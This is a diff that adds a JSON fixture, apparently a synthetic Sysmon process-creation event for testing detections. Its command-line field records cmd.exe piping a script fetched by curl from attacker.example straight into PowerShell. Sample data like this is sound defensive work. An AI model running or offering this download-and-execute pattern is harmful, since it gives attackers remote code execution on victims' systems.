@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "Image": "C:\\Windows\\System32\\cmd.exe",
+  "CommandLine": "cmd.exe /c curl http://attacker.example/x.ps1 | powershell -",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "User": "CORP\\victim",
+  "_time": "2026-04-25T15:01:11Z"
+}
